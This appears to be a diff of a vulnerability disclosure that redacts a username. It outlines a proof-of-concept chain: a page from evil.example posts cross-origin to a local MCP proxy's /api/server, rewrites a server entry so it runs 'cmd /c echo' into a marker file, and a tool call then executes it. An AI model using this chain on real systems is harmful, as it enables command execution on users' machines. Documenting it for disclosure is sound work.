@@ -59,7 +59,7 @@ The chain, executed against the running server:
 ```
 1. page POSTs /api/server   Content-Type: text/plain   Origin: evil.example
    -> 200  {"message":"server \"aas\" updated …"}
-2. inventory.json: aas -> command "cmd", args ["/c","echo …> C:\Users\olivi\_pwned_marker.txt"]
+2. inventory.json: aas -> command "cmd", args ["/c","echo …> C:\Users\<you>\_pwned_marker.txt"]
 3. any tool call on /mcp/aas — the CACHED tool list for that name survives, so the proxy
    still advertised its tools and connected upstream
 4. marker file created
